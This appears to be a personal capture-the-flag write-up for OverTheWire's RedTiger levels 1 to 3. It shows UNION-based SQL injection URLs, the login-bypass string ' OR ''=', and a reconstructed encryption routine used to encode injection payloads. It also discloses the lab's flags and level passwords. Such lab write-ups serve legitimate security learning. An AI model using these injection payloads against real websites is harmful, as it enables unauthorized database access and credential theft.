## Level 1

**URL:** https://redtiger.labs.overthewire.org/level1.php
**Target:** Get the login for the user Hornoxe
**Tablename:** level1_users

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502022328468.png" alt="image-20200502022328468" style="border:1px solid black;" />



Clicking on category 1 sent the value 1 to parameter "cat", and presented additional text. This might indicate a potential SQLi attack.

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502022636412.png" alt="image-20200502022636412" style="border:1px solid black;" />

<center> ?cat=1



I figured that the SQL query might look similar to this, where `[cat]` can be defined by me:

```sql
SELECT ?,?,... 
FROM ... 
WHERE cat=[cat] ... ;
```

I decided to use the `UNION` function to plot the requested password. For that to work, I wanted to bring the query to the following form:

```sql
SELECT ?,?,... 
FROM ... 
WHERE cat=1 
UNION 
SELECT password 
FROM level1_users; -- ...
```

I set `[cat]` to be `1 UNION SELECT password FROM level1_users; --` (adding "; -- " to make sure the rest of the query is ignored in case it exists).

The problem was I did not know how many columns the table has. I started adding columns to the selection until I reached the right number (4):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502023938850.png" alt="image-20200502023938850" style="border:1px solid black;" />

<center>?cat=1%20UNION%20SELECT%20password,2,3,4%20FROM%20level1_users;%20--



I could tell that columns 3 and 4 are presented to the user, so I made sure the column "password" is selected third:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502024312259.png" alt="image-20200502024312259" style="border:1px solid black;" />

<center> cat=1%20UNION%20SELECT%201,2,password,4%20FROM%20level1_users;%20



And there it was! I used the password (**thatwaseasy**) to receive the flag (**27cbddc803ecde822d87a7e8639f9315**) and the password for Level 2 (**passwords_will_change_over_time_let_us_do_a_shitty_rhyme**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502024653899.png" alt="image-20200502024653899" style="border:1px solid black;" />



## Level 2

**URL:** https://redtiger.labs.overthewire.org/level2.php
**Target:** Login
**Hint:** Condition

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502025042081.png" alt="image-20200502025042081" style="border: 1px solid black;" />



The general SQL query I assumed, where `[username]` and `[password]` can be defined by me:

```sql
SELECT ?,?,... 
FROM table_name 
WHERE (username='[username]') AND (password='[password]');
```

I decided to try and get the query to look like that:

```sql
SELECT ?,?,... 
FROM table_name 
WHERE (username='' OR ''='') AND (password='' OR ''='');
```

That way, since `''=''` is always `TRUE`, the table will not be empty.

For that to happen, I set `[username] = [password] = ' OR ''='`.

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502030344385.png" alt="image-20200502030344385" style="border:1px solid black;" />



It worked!  I received the flag (**1222e2d4ad5da677efb188550528bfaa**) and the password for Level 3 (**feed_the_cat_who_eats_your_bread**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502030404417.png" alt="image-20200502030404417" style="border:1px solid black;" />



## Level 3

**URL:** https://redtiger.labs.overthewire.org/level3.php
**Target:** Get the password of the user Admin.
**Hint:** Try to get an error. Tablename: level3_users

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502030709145.png" alt="image-20200502030709145" style="border:1px solid black;" />



Clicking on "Admin" sent to the parameter "usr" what seems to be a base64 encoded identifier. It also presented additional details:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502030936640.png" alt="image-20200502030936640" style="border:1px solid black;" />

<center> ?usr=MDQyMjExMDE0MTgyMTQw



I decoded the string (**MDQyMjExMDE0MTgyMTQw**) using [CyberChef](https://gchq.github.io/CyberChef) and received random digits (**042211014182140**).

At that point I tried encoding different SQL instructions into base64 and send them as a parameter, but got no results.

I followed the hint given ("Try to get an error"), and after several tries received an error by sending an array as a parameter:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502031645737.png" alt="image-20200502031645737" style="border:1px solid black;" />

<center>  ?usr[]=MDYzMjIzMDA2MTU2MTQxMjU0



The server seemed to run the following PHP file (https://redtiger.labs.overthewire.org/urlcrypt.inc) to handle the encryption:

```php
<?php
	// warning! ugly code ahead :)
	// requires php5.x, sorry for that
	function encrypt($str)
	{
		$cryptedstr = "";
		srand(3284724);
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
	function decrypt ($str)
	{
		srand(3284724);
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}
				foreach($array as $s)
				{
					$a = $s ^ rand(0, 255);
					$decStr .= chr($a);
				}
				return $decStr;
			}
			return false;
		}
		return false;
	}
?>
```

I copied the code to [writephponline.com](http://www.writephponline.com/) to easily run it online. I added the following line to the end of the code to decode the admin's hashed string:

```php
echo decrypt("MDQyMjExMDE0MTgyMTQw");
```

I ran the code and received the following output: `�(D��`. I noticed the comment saying that it requires php5.x, and then used [phptester.net](http://phptester.net/) to run the same code on php5.5. I received the following decrypted output: `Admin`

Now that I knew I have the right functions, I used them to to encrypt the payload:

```php
echo encrypt("' union select 1 from level3_users where Username='Admin' --");
```

I copied the encrypted output to into the URL and got an error:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502033411449.png" alt="image-20200502033411449" style="border:1px solid black;" />

<center>?usr=MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1M
Dg0MjU1MDA3MjM5MDA1MDk2MjAzMTc5MTQ2MDE4MTkxMTk0MjA3MjE4MDU3MTk4MTQ
5MTE4MTA3MjQwMTQ1MjAyMTcwMTA4MDMzMjQwMTY5MDUwMTU5MTkwMTc0MDAxMTk4M
DcxMTk1MDQ5MTEzMTQyMTU1MDY1MDMyMjQ3MjQ3MTAzMTIzMDAz



I kept adding columns to the query, encrypting the string and sending it. I got the same error until I reached 7 columns:

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502033751287.png" alt="image-20200502033751287" style="border:1px solid black;" />

<center> ?usr=MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MT
g3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMjAzMTY1MDQyMT
k5MTU5MTA1MDU2MTg4MTMxMjEyMTcwMTE0MTE5MTQzMTM3MDUwMTU5MTkwMTc5MDY0Mj
IwMDc0MTU1MTAwMDg1MjAyMTYzMDkxMDQzMTYyMTg1MDQzMDU5MDcwMTk0MDk2MTAyMT
I0MTIyMTAzMjEzMTkyMDEzMjEwMTQ5MDEw   
</center>



To plot the password I changed column 2 to `password`, encrypted the payload and sent it:

```php
echo encrypt("' union select 1,password,3,4,5,6,7 from level3_users where Username='Admin' --");
```

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502034023838.png" alt="image-20200502034023838" style="border:1px solid black;" />

<center> ?usr=MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0
MTg3MDk1MDg0MjQzMDE3MjUyMDI1MTI2MTU2MTc2MTMzMDAwMjQ2MTU3MjA
4MTc3MDk2MTI4MjIwMDUwMDUyMjMxMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MD
M2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxM
TY1MDQ3MTE4MTE4MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTkwMjIw
MDcxMDQwMjIwMjA5MDM0MDYyMTQzMDA1
</center>



It worked! I used the password (**thisisaverysecurepasswordEEE5rt**) to receive the flag (**a707b245a60d570d25a0449c2a516eca**) and the password for Level 4 (**put_the_kitten_on_your_head**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502034148671.png" alt="image-20200502034148671" style="border:1px solid black;" />
